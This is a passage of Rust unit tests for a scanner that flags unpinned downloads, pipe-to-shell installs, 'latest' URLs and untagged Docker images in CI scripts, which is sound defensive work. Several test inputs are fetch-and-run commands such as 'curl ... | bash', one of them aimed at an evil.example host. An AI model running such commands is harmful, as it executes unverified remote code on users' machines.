        assert!(c.allowed.is_empty());
        assert!(
            c.findings
                .iter()
                .any(|f| f.description.contains("got() request"))
        );
        assert!(
            c.findings
                .iter()
                .any(|f| f.description.contains("http.get()"))
        );
    }

    #[test]
    fn js_scan_got_method_and_require_http_get_are_findings() {
        let mut c = AuditCollector::new(true);
        scan_js_content(
            r#"
const a = await got.get("https://example.com/api/data");
const b = require("http").get("http://example.com/install.sh", cb);
const d = require("node:https").get("https://example.com/install.sh", cb);
"#,
            "test.js",
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert_eq!(c.findings.len(), 3);
        assert!(c.allowed.is_empty());
    }

    #[test]
    fn shell_scan_pipe_to_sh_versioned_still_high() {
        let mut c = AuditCollector::new(true);
        scan_shell_content(
            "curl -sSL https://example.com/releases/download/v1.2.3/install.sh | sh",
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert_eq!(c.findings.len(), 1, "expected exactly one finding");
        assert_eq!(c.findings[0].severity, "high");
        assert!(c.findings[0].description.contains("piped to shell"));
        assert!(c.allowed.is_empty());
    }

    #[test]
    fn shell_scan_pipe_to_sh_not_suppressed_by_checksum() {
        let mut c = AuditCollector::new(false);
        scan_shell_content(
            "curl -sSL https://example.com/install.sh | sh\nsha256sum -c checksums.txt",
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        // Pipe-to-shell is exempt: the payload is never written to disk, so a
        // nearby checksum cannot verify it. The finding stands at high severity.
        assert_eq!(c.findings.len(), 1);
        assert_eq!(c.findings[0].severity, "high");
    }

    #[test]
    fn shell_scan_pipe_to_sh_deduplicates_with_latest_pattern() {
        let mut c = AuditCollector::new(false);
        scan_shell_content(
            "curl -L https://example.com/releases/latest/install.sh | sh",
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert_eq!(c.findings.len(), 1);
        assert_eq!(c.findings[0].severity, "high");
        assert!(c.findings[0].description.contains("piped to shell"));
    }

    #[test]
    fn shell_scan_proc_sub_is_finding() {
        let mut c = AuditCollector::new(false);
        scan_shell_content(
            "bash <(curl -L https://example.com/install.sh)",
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert_eq!(c.findings.len(), 1);
        assert_eq!(c.findings[0].severity, "high");
        assert!(c.findings[0].description.contains("process substitution"));
    }

    #[test]
    fn dockerfile_scan_pipe_shell_escalates_to_high() {
        let mut c = AuditCollector::new(false);
        scan_dockerfile_content(
            "FROM ubuntu:22.04\nRUN curl -sSL https://example.com/install.sh | sh\n",
            "Dockerfile",
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert_eq!(c.findings.len(), 1);
        assert_eq!(c.findings[0].severity, "high");
        assert!(c.findings[0].description.contains("piped to shell"));
    }

    #[test]
    fn dockerfile_scan_pipe_shell_across_continuation() {
        // RUN instructions lean on backslash continuations — the fetch and
        // the pipe may sit on different physical lines.
        let mut c = AuditCollector::new(false);
        scan_dockerfile_content(
            "FROM ubuntu:22.04\nRUN curl -sSL https://example.com/install.sh \\\n    | sh\n",
            "Dockerfile",
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert_eq!(c.findings.len(), 1);
        assert_eq!(c.findings[0].severity, "high");
        assert_eq!(c.findings[0].line, Some(2));
    }

    #[test]
    fn dockerfile_scan_from_platform_latest_is_finding() {
        let mut c = AuditCollector::new(false);
        scan_dockerfile_content(
            "FROM --platform=linux/amd64 node:latest\n",
            "Dockerfile",
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert_eq!(c.findings.len(), 1);
        assert_eq!(c.findings[0].severity, "high");
    }

    #[test]
    fn dockerfile_scan_add_unversioned_url_is_finding() {
        let mut c = AuditCollector::new(false);
        scan_dockerfile_content(
            "FROM ubuntu:22.04\nADD https://example.com/install.tar.gz /tmp/\n",
            "Dockerfile",
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert_eq!(c.findings.len(), 1);
        assert_eq!(c.findings[0].severity, "medium");
        assert!(c.findings[0].description.contains("ADD with URL source"));
    }

    #[test]
    fn dockerfile_scan_add_versioned_url_is_allowed() {
        let mut c = AuditCollector::new(true);
        scan_dockerfile_content(
            "FROM ubuntu:22.04\nADD https://example.com/releases/download/v1.2.3/install.tar.gz /tmp/\n",
            "Dockerfile",
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert!(c.findings.is_empty());
        assert_eq!(c.allowed.len(), 1);
        assert_eq!(c.allowed[0].reason, "versioned URL");
    }

    #[test]
    fn dockerfile_scan_add_data_format_url_is_allowed() {
        let mut c = AuditCollector::new(true);
        scan_dockerfile_content(
            "FROM ubuntu:22.04\nADD https://example.com/config.json /etc/\n",
            "Dockerfile",
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert!(c.findings.is_empty());
        assert_eq!(c.allowed.len(), 1);
        assert_eq!(c.allowed[0].reason, "data format URL");
        assert_eq!(c.extra_data_format_allowed, 0);
    }

    #[test]
    fn dockerfile_scan_add_local_src_not_flagged() {
        let mut c = AuditCollector::new(false);
        scan_dockerfile_content(
            "FROM ubuntu:22.04\nADD ./local.tar.gz /tmp/\n",
            "Dockerfile",
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert!(c.findings.is_empty());
    }

    #[test]
    fn shell_scan_data_format_url_is_allowed_not_finding() {
        // Real Homebrew/core workflow line — regression anchor.
        let mut c = AuditCollector::new(true);
        scan_shell_content(
            r#"DATA_30="$(curl -s https://formulae.brew.sh/api/analytics/install/homebrew-core/30d.json)""#,
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert!(c.findings.is_empty());
        assert_eq!(c.allowed.len(), 1);
        assert_eq!(c.allowed[0].reason, "data format URL");
        assert_eq!(c.extra_data_format_allowed, 0);
    }

    #[test]
    fn shell_scan_data_format_url_dropped_without_verbose() {
        let mut c = AuditCollector::new(false);
        scan_shell_content(
            "curl -s https://example.com/config.yaml -o config.yaml",
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert!(c.findings.is_empty());
        assert!(c.allowed.is_empty());
    }

    #[test]
    fn shell_scan_non_data_url_still_flagged() {
        let mut c = AuditCollector::new(false);
        scan_shell_content(
            "curl -L https://example.com/install.sh -o install.sh",
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert_eq!(c.findings.len(), 1);
    }

    #[test]
    fn shell_scan_fetch_piped_to_jq_is_allowed_not_finding() {
        // A crates.io registry query: an extensionless JSON API piped to jq.
        // Data, not code — no config needed.
        let mut c = AuditCollector::new(true);
        scan_shell_content(
            r#"LATEST=$(curl -fsSL -H "$UA" "https://crates.io/api/v1/crates/${TOOL}" | jq -r '.crate.max_stable_version')"#,
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert!(c.findings.is_empty());
        assert_eq!(c.allowed.len(), 1);
        assert_eq!(c.allowed[0].reason, "piped to jq");
    }

    #[test]
    fn shell_scan_jq_exemption_does_not_cover_later_fetch() {
        let mut c = AuditCollector::new(true);
        scan_shell_content(
            "curl https://api.example.com/v1/data | jq . && curl https://evil.example/install.sh",
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert_eq!(c.findings.len(), 1);
        assert!(
            c.findings[0]
                .description
                .contains("curl fetching URL without version pinning")
        );
        assert_eq!(c.allowed.len(), 1);
        assert_eq!(c.allowed[0].reason, "piped to jq");
    }

    #[test]
    fn shell_scan_fetch_to_jq_then_shell_is_still_pipe_to_shell() {
        // jq anywhere in the pipeline must not downgrade a fetch that ends at a
        // shell — pipe-to-shell pre-empts and fires its own finding.
        let mut c = AuditCollector::new(false);
        scan_shell_content(
            "curl -fsSL https://evil.example/c | jq -r .cmd | bash",
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert_eq!(c.findings.len(), 1);
        assert!(c.findings[0].description.contains("piped to shell"));
    }

    #[test]
    fn js_scan_data_format_url_is_allowed() {
        let mut c = AuditCollector::new(true);
        scan_js_content(
            r#"const r = await fetch("https://example.com/config.json");"#,
            "test.js",
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert!(c.findings.is_empty());
        assert_eq!(c.allowed.len(), 1);
        assert_eq!(c.allowed[0].reason, "data format URL");
        assert_eq!(c.extra_data_format_allowed, 0);
    }

    #[test]
    fn py_scan_data_format_url_is_allowed() {
        let mut c = AuditCollector::new(true);
        scan_py_content(
            r#"r = requests.get("https://example.com/data.json")"#,
            "test.py",
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert!(c.findings.is_empty());
        assert_eq!(c.allowed.len(), 1);
        assert_eq!(c.allowed[0].reason, "data format URL");
        assert_eq!(c.extra_data_format_allowed, 0);
    }

    #[test]
    fn py_scan_follows_literal_url_binding() {
        let mut c = AuditCollector::new(true);
        scan_py_content(
            "endpoint = 'https://example.com/install.sh'\nrequests.get(endpoint)",
            "test.py",
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert_eq!(c.findings.len(), 1);
        assert!(
            c.findings[0]
                .description
                .contains("bound to an external URL")
        );
    }

    #[test]
    fn py_scan_invalidates_literal_binding_after_dynamic_reassignment() {
        let mut c = AuditCollector::new(true);
        scan_py_content(
            "endpoint = 'https://example.com/v1.2.3/tool'\nendpoint = os.environ['DOWNLOAD_URL']\nrequests.get(endpoint)",
            "test.py",
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert_eq!(c.findings.len(), 1);
        assert!(c.allowed.is_empty());
        assert!(c.findings[0].description.contains("could not be verified"));
    }

    #[test]
    fn py_scan_marks_unresolved_dynamic_fetch_as_a_finding() {
        let mut c = AuditCollector::new(false);
        scan_py_content(
            "requests.get(os.environ['DOWNLOAD_URL'])",
            "test.py",
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert_eq!(c.findings.len(), 1);
        assert!(c.findings[0].description.contains("could not be verified"));
    }

    #[test]
    fn py_scan_multiline_sinks_wait_for_their_first_argument() {
        for source in [
            "requests.get(\n    'https://example.com/v1.2.3/tool',\n    timeout=10,\n)",
            "endpoint = 'https://example.com/v1.2.3/tool'\nrequests.get(\n    # preserve source formatting\n    endpoint,\n    timeout=10,\n)",
        ] {
            let mut c = AuditCollector::new(true);
            scan_py_content(source, "src/action.py", "", &mut c, &DEFAULT_CONFIG);
            assert!(c.findings.is_empty(), "source: {source}");
            assert_eq!(c.allowed.len(), 1, "source: {source}");
        }

        for source in [
            "requests.get(\n    'https://example.com/tool',\n    timeout=10,\n)",
            "endpoint = 'https://example.com/tool'\nrequests.get(\n    endpoint,\n    timeout=10,\n)",
        ] {
            let mut c = AuditCollector::new(false);
            scan_py_content(source, "src/action.py", "", &mut c, &DEFAULT_CONFIG);
            assert_eq!(c.findings.len(), 1, "source: {source}");
            assert_eq!(
                c.findings[0].line,
                Some(if source.starts_with("requests") { 1 } else { 2 }),
                "source: {source}"
            );
        }

        for source in [
            "requests.get(\n    'https://example.com/releases/latest/tool'\n)",
            "endpoint = 'https://example.com/releases/latest/tool'\nrequests.get(\n    endpoint\n)",
            "requests.get(\n    'https://example.com/v1.2.3/releases/'\n    'latest/tool'\n)",
        ] {
            let mut c = AuditCollector::new(false);
            scan_py_content(source, "src/action.py", "", &mut c, &DEFAULT_CONFIG);
            assert_eq!(c.findings.len(), 1, "source: {source}");
            assert_eq!(c.findings[0].severity, "high", "source: {source}");
        }

        for source in [
            "endpoint = 'https://example.com/v1.2.3/tool'\ndef load(endpoint):\n    return requests.get(\n        endpoint\n    )",
            "endpoint = 'https://example.com/v1.2.3/tool'\ndef load(\n    endpoint: str,\n):\n    return requests.get(\n        endpoint\n    )",
        ] {
            let mut c = AuditCollector::new(true);
            scan_py_content(source, "src/action.py", "", &mut c, &DEFAULT_CONFIG);
            assert_eq!(c.findings.len(), 1, "source: {source}");
            assert!(c.allowed.is_empty(), "source: {source}");
        }
    }

    #[test]
    fn shell_scan_honors_extra_data_formats() {
        let config = Config {
            extra_data_formats: vec!["proto".to_string()],
            ..Config::default()
        };
        let mut c = AuditCollector::new(true);
        scan_shell_content(
            "curl -sSL https://example.com/api.proto -o schema.proto",
            "test.sh",
            1,
            "",
            &mut c,
            &config,
        );
        assert!(c.findings.is_empty());
        assert_eq!(c.allowed.len(), 1);
        assert_eq!(c.allowed[0].reason, REASON_EXTRA_DATA_FORMAT);
        assert_eq!(c.extra_data_format_allowed, 1);
    }

    #[test]
    fn shell_scan_non_configured_extension_still_flagged() {
        let config = Config {
            extra_data_formats: vec!["proto".to_string()],
            ..Config::default()
        };
        let mut c = AuditCollector::new(false);
        scan_shell_content(
            "curl -L https://example.com/install.sh -o install.sh",
            "test.sh",
            1,
            "",
            &mut c,
            &config,
        );
        assert_eq!(c.findings.len(), 1);
    }

    #[test]
    fn shell_scan_trusted_host_is_allowed() {
        let config = Config {
            trusted_hosts: vec!["artifacts.example.com".to_string()],
            ..Config::default()
        };
        let mut c = AuditCollector::new(true);
        scan_shell_content(
            "curl -L https://artifacts.example.com/install.sh -o install.sh",
            "test.sh",
            1,
            "",
            &mut c,
            &config,
        );
        assert!(c.findings.is_empty());
        assert_eq!(c.allowed.len(), 1);
        assert_eq!(c.allowed[0].reason, "trusted host");
        assert_eq!(c.trusted_host_allowed, 1);
    }

    #[test]
    fn shell_scan_untrusted_host_still_flagged() {
        let config = Config {
            trusted_hosts: vec!["artifacts.example.com".to_string()],
            ..Config::default()
        };
        let mut c = AuditCollector::new(false);
        scan_shell_content(
            "curl -L https://other.example.com/install.sh -o install.sh",
            "test.sh",
            1,
            "",
            &mut c,
            &config,
        );
        assert_eq!(c.findings.len(), 1);
    }

    #[test]
    fn shell_scan_trusted_host_does_not_exempt_latest() {
        // `/latest/` still fires on a trusted host — the risk is about the
        // mutable path, not about who's serving it.
        let config = Config {
            trusted_hosts: vec!["artifacts.example.com".to_string()],
            ..Config::default()
        };
        let mut c = AuditCollector::new(false);
        scan_shell_content(
            "curl -L https://artifacts.example.com/releases/latest/install.sh -o foo",
            "test.sh",
            1,
            "",
            &mut c,
            &config,
        );
        assert_eq!(c.findings.len(), 1);
        assert_eq!(c.findings[0].severity, "high");
        assert!(c.findings[0].description.contains("'latest' URL"));
    }

    #[test]
    fn shell_scan_trusted_host_does_not_exempt_pipe_to_shell() {
        // Pipe-to-shell still fires on a trusted host — payload isn't
        // written to disk regardless of who's serving it.
        let config = Config {
            trusted_hosts: vec!["artifacts.example.com".to_string()],
            ..Config::default()
        };
        let mut c = AuditCollector::new(false);
        scan_shell_content(
            "curl -sSL https://artifacts.example.com/install.sh | sh",
            "test.sh",
            1,
            "",
            &mut c,
            &config,
        );
        assert_eq!(c.findings.len(), 1);
        assert_eq!(c.findings[0].severity, "high");
        assert!(c.findings[0].description.contains("piped to shell"));
    }

    #[test]
    fn js_scan_trusted_host_is_allowed() {
        let config = Config {
            trusted_hosts: vec!["api.example.com".to_string()],
            ..Config::default()
        };
        let mut c = AuditCollector::new(true);
        scan_js_content(
            r#"const r = await fetch("https://api.example.com/data");"#,
            "test.js",
            "",
            &mut c,
            &config,
        );
        assert!(c.findings.is_empty());
        assert_eq!(c.allowed.len(), 1);
        assert_eq!(c.allowed[0].reason, "trusted host");
    }

    #[test]
    fn gh_release_download_without_tag_is_finding() {
        let mut c = AuditCollector::new(false);
        scan_shell_content(
            "gh release download -R owner/repo -p '*.tar.gz'",
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert_eq!(c.findings.len(), 1);
        assert_eq!(c.findings[0].severity, "medium");
        assert!(c.findings[0].description.contains("gh release download"));
    }

    #[test]
    fn js_minified_line_splitting() {
        let mut c = AuditCollector::new(false);
        // A >500-char minified line with a fetch buried inside.
        let padding = "a".repeat(450);
        let minified = format!(
            r#"{}; const r = await fetch("https://example.com/api/data"); {}"#,
            padding, padding
        );
        scan_js_content(&minified, "dist/index.js", "", &mut c, &DEFAULT_CONFIG);
        assert_eq!(c.findings.len(), 1);
    }

    #[test]
    fn dockerfile_digest_pinned_skipped() {
        let mut c = AuditCollector::new(false);
        scan_dockerfile_content(
            "FROM ubuntu@sha256:abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890\nRUN echo hello\n",
            "Dockerfile",
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert!(c.findings.is_empty());
    }

    #[test]
    fn dockerfile_from_latest_is_finding() {
        let mut c = AuditCollector::new(false);
        scan_dockerfile_content(
            "FROM ubuntu:latest\nRUN echo hello\n",
            "Dockerfile",
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert_eq!(c.findings.len(), 1);
    }

    #[test]
    fn dockerfile_from_no_tag_is_finding() {
        let mut c = AuditCollector::new(false);
        scan_dockerfile_content(
            "FROM ubuntu\nRUN echo hello\n",
            "Dockerfile",
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert_eq!(c.findings.len(), 1);
    }

    #[test]
    fn dockerfile_from_named_stage_not_flagged() {
        // `FROM builder` references the stage defined above, not an image pull.
        let mut c = AuditCollector::new(false);
        scan_dockerfile_content(
            "FROM golang:1.21 AS builder\nRUN echo build\nFROM builder\nRUN echo package\n",
            "Dockerfile",
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert!(
            c.findings.is_empty(),
            "findings: {:?}",
            c.findings
                .iter()
                .map(|f| &f.description)
                .collect::<Vec<_>>()
        );
    }

    #[test]
    fn dockerfile_from_scratch_not_flagged() {
        let mut c = AuditCollector::new(false);
        scan_dockerfile_content(
            "FROM golang:1.21 AS builder\nFROM scratch\nCOPY --from=builder /app /app\n",
            "Dockerfile",
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert!(
            c.findings.is_empty(),
            "findings: {:?}",
            c.findings
                .iter()
                .map(|f| &f.description)
                .collect::<Vec<_>>()
        );
    }

    #[test]
    fn dockerfile_stage_alias_collected_with_platform_flag() {
        // The stage is declared with a --platform flag; the later `FROM builder`
        // must still be recognized as a stage reference.
        let mut c = AuditCollector::new(false);
        scan_dockerfile_content(
            "FROM --platform=$BUILDPLATFORM golang:1.21 AS builder\nFROM builder\n",
            "Dockerfile",
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert!(
            c.findings.is_empty(),
            "findings: {:?}",
            c.findings
                .iter()
                .map(|f| &f.description)
                .collect::<Vec<_>>()
        );
    }

    #[test]
    fn dockerfile_untagged_base_with_stage_name_still_flagged() {
        // `FROM ubuntu AS builder` pulls untagged ubuntu (implicitly :latest);
        // naming the stage must not suppress the finding on the real base.
        let mut c = AuditCollector::new(false);
        scan_dockerfile_content(
            "FROM ubuntu AS builder\nRUN echo hi\n",
            "Dockerfile",
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert_eq!(c.findings.len(), 1);
        assert!(c.findings[0].description.contains("FROM without tag"));
    }

    #[test]
    fn dockerfile_git_clone_followed_by_sha_checkout_is_allowed() {
        let mut c = AuditCollector::new(true);
        scan_dockerfile_content(
            "FROM alpine:3.20\nRUN git clone https://github.com/org/repo /src && git -C /src checkout abcdef1234567890abcdef1234567890abcdef12\n",
            "Dockerfile",
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert!(c.findings.is_empty());
        assert_eq!(c.allowed.len(), 1);
        assert_eq!(c.allowed[0].reason, "followed by SHA checkout");
    }

    #[test]
    fn py_scan_trusted_host_is_allowed() {
        let config = Config {
            trusted_hosts: vec!["api.example.com".to_string()],
            ..Config::default()
        };
        let mut c = AuditCollector::new(true);
        scan_py_content(
            r#"r = requests.get("https://api.example.com/data")"#,
            "test.py",
            "",
            &mut c,
            &config,
        );
        assert!(c.findings.is_empty());
        assert_eq!(c.allowed.len(), 1);
        assert_eq!(c.allowed[0].reason, "trusted host");
    }

    #[test]
    fn finding_includes_action_name() {
        let mut c = AuditCollector::new(false);
        scan_shell_content(
            "curl -L https://example.com/install.sh -o foo",
            "test.sh",
            1,
            "actions/checkout@abc1234",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert_eq!(c.findings.len(), 1);
        assert_eq!(c.findings[0].action, "actions/checkout@abc1234");
    }

    #[test]
    fn downloaded_checksum_sidecar_at_boundary_does_not_suppress() {
        let mut c = AuditCollector::new(true);
        scan_shell_content(
            "curl -L https://example.com/downloads/tool -o tool\necho step1\necho step2\nsha256sum --check tool.sha256",
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert_eq!(c.findings.len(), 1);
        assert!(c.allowed.is_empty());
    }

    #[test]
    fn checksum_beyond_three_lines_not_suppressed() {
        let mut c = AuditCollector::new(false);
        scan_shell_content(
            "curl -L https://example.com/downloads/tool -o tool\necho 1\necho 2\necho 3\nsha256sum --check tool.sha256",
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        // Checksum is on the fourth line — beyond the window — so the fetch is
        // still flagged.
        assert_eq!(c.findings.len(), 1);
        assert_eq!(c.findings[0].severity, "medium");
    }

    #[test]
    fn shell_scan_latest_url_not_suppressed_by_checksum() {
        let mut c = AuditCollector::new(true);
        scan_shell_content(
            "curl -L https://example.com/releases/latest/download/tool -o tool\nsha256sum --check tool.sha256",
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert_eq!(c.findings.len(), 1);
        assert_eq!(c.findings[0].severity, "high");
        assert!(c.findings[0].description.contains("'latest' URL"));
        assert!(c.allowed.is_empty());
    }

    // ── git clone ─────────────────────────────────────────────────────

    #[test]
    fn git_clone_unpinned_is_finding() {
        let mut c = AuditCollector::new(false);
        scan_shell_content(
            "git clone https://github.com/org/repo",
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert_eq!(c.findings.len(), 1);
        assert_eq!(c.findings[0].severity, "medium");
        assert!(c.findings[0].description.contains("git clone"));
    }

    #[test]
    fn git_clone_versioned_branch_clean() {
        let mut c = AuditCollector::new(false);
        scan_shell_content(
            "git clone --branch v1.2.3 https://github.com/org/repo",
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert!(c.findings.is_empty());
    }

    #[test]
    fn git_clone_main_branch_is_finding() {
        let mut c = AuditCollector::new(false);
        scan_shell_content(
            "git clone --branch main https://github.com/org/repo",
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert_eq!(c.findings.len(), 1);
    }

    #[test]
    fn git_clone_depth_one_versioned_clean() {
        let mut c = AuditCollector::new(false);
        scan_shell_content(
            "git clone --depth 1 --branch v1.2.3 https://github.com/org/repo",
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert!(c.findings.is_empty());
    }

    #[test]
    fn git_clone_followed_by_sha_checkout_is_allowed() {
        let mut c = AuditCollector::new(true);
        scan_shell_content(
            "git clone https://github.com/org/repo\ncd repo\ngit checkout abcdef1234567890abcdef1234567890abcdef12",
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert!(c.findings.is_empty());
        assert_eq!(c.allowed.len(), 1);
        assert_eq!(c.allowed[0].reason, "followed by SHA checkout");
    }

    #[test]
    fn git_clone_unrelated_sha_checkout_is_finding() {
        let mut c = AuditCollector::new(true);
        scan_shell_content(
            "git clone https://github.com/attacker/repo\ncd other\ngit checkout abcdef1234567890abcdef1234567890abcdef12",
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert_eq!(c.findings.len(), 1);
        assert!(c.findings[0].description.contains("git clone"));
        assert!(c.allowed.is_empty());
    }

    #[test]
    fn git_clone_sha_checkout_beyond_three_lines_still_finding() {
        let mut c = AuditCollector::new(false);
        scan_shell_content(
            "git clone https://github.com/org/repo\necho 1\necho 2\necho 3\ngit checkout abcdef1234567890abcdef1234567890abcdef12",
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert_eq!(c.findings.len(), 1);
    }

    #[test]
    fn git_clone_same_line_sha_checkout_is_allowed() {
        let mut c = AuditCollector::new(true);
        scan_shell_content(
            "git clone https://github.com/org/repo && cd repo && git checkout abcdef1234567890abcdef1234567890abcdef12",
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert!(c.findings.is_empty());
        assert_eq!(c.allowed.len(), 1);
        assert_eq!(c.allowed[0].reason, "followed by SHA checkout");
    }

    #[test]
    fn git_clone_git_c_sha_checkout_is_allowed() {
        let mut c = AuditCollector::new(true);
        scan_shell_content(
            "git clone https://github.com/org/repo d\ngit -C d checkout abcdef1234567890abcdef1234567890abcdef12",
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert!(c.findings.is_empty());
        assert_eq!(c.allowed.len(), 1);
        assert_eq!(c.allowed[0].reason, "followed by SHA checkout");
    }

    #[test]
    fn shell_scan_catches_fetch_split_across_continuation() {
        // A two-part pattern (command + URL) split across a backslash
        // continuation is one shell command and must be seen whole.
        let mut c = AuditCollector::new(false);
        scan_shell_content(
            "curl -L \\\n  https://example.com/install.sh -o install.sh\n",
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert_eq!(c.findings.len(), 1);
        assert_eq!(c.findings[0].severity, "medium");
        assert_eq!(c.findings[0].line, Some(1));
    }

    #[test]
    fn shell_scan_pipe_through_intermediate_stage_single_high_finding() {
        let mut c = AuditCollector::new(false);
        scan_shell_content(
            "curl -fsSL https://example.com/install.sh | tr -d '\\r' | bash",
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert_eq!(c.findings.len(), 1);
        assert_eq!(c.findings[0].severity, "high");
    }

    #[test]
    fn shell_scan_comment_backslash_does_not_hide_next_line() {
        // A trailing backslash on a comment is comment text — the next line
        // is a new command and must still be scanned.
        let mut c = AuditCollector::new(false);
        scan_shell_content(
            "# see docs \\\ncurl https://example.com/install.sh | sh\n",
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert_eq!(c.findings.len(), 1);
        assert_eq!(c.findings[0].severity, "high");
        assert_eq!(c.findings[0].line, Some(2));
    }

    #[test]
    fn shell_scan_same_line_downloaded_sidecar_not_suppressed() {
        let mut c = AuditCollector::new(true);
        scan_shell_content(
            "curl -o tool.tgz https://example.com/tool.tgz && sha256sum -c tool.tgz.sha256",
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert_eq!(c.findings.len(), 1);
        assert!(c.allowed.is_empty());
    }

    #[test]
    fn shell_scan_piped_checksum_manifest_suppresses_fetch() {
        let mut c = AuditCollector::new(true);
        scan_shell_content(
            "curl -o tool https://example.com/tool\necho \"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa  tool\" | shasum -a 256 -c -",
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert!(c.findings.is_empty());
        assert_eq!(c.allowed.len(), 1);
        assert_eq!(c.allowed[0].reason, "followed by checksum verification");
    }

    #[test]
    fn shell_scan_target_specific_downloaded_manifest_does_not_suppress_fetch() {
        let mut c = AuditCollector::new(true);
        scan_shell_content(
            "curl -o tool https://example.com/tool\nshasum -a 256 -c tool.sha256",
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert_eq!(c.findings.len(), 1);
        assert!(c.allowed.is_empty());
    }

    #[test]
    fn shell_scan_runtime_downloaded_signature_does_not_suppress_fetches() {
        let mut c = AuditCollector::new(true);
        scan_shell_content(
            "curl -o tool https://example.com/tool\ncurl -o tool.sig https://example.com/tool.sig\ngpg --verify tool.sig tool",
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert_eq!(c.findings.len(), 2);
        assert!(c.allowed.is_empty());
    }

    #[test]
    fn shell_scan_runtime_imported_key_does_not_suppress_fetch() {
        for key_setup in [
            "curl -o key.asc https://example.com/v1.2.3/key.asc\ngpg --import key.asc",
            "curl https://example.com/v1.2.3/key.asc | gpg --import",
            "gpg --import <(curl https://example.com/v1.2.3/key.asc)",
        ] {
            let mut c = AuditCollector::new(true);
            scan_shell_content(
                &format!(
                    "{key_setup}\ncurl -o tool https://example.com/tool\ngpg --verify committed.sig tool"
                ),
                "test.sh",
                1,
                "",
                &mut c,
                &DEFAULT_CONFIG,
            );
            assert!(
                c.findings
                    .iter()
                    .any(|finding| finding.pattern_matched.contains("curl -o tool")),
                "key setup: {key_setup}"
            );
            assert!(
                c.allowed
                    .iter()
                    .all(|allowed| allowed.reason != "followed by checksum verification"),
                "key setup: {key_setup}"
            );
        }
    }

    #[test]
    fn shell_scan_runtime_imported_key_does_not_block_literal_checksum() {
        let mut c = AuditCollector::new(true);
        scan_shell_content(
            "curl -o key.asc https://example.com/v1.2.3/key.asc\ngpg --import key.asc\ncurl -o tool https://example.com/tool\necho 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa  tool' | sha256sum -c -",
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert!(c.findings.is_empty());
        assert!(
            c.allowed
                .iter()
                .any(|allowed| allowed.reason == "followed by checksum verification")
        );

        let mut mixed = AuditCollector::new(true);
        scan_shell_content(
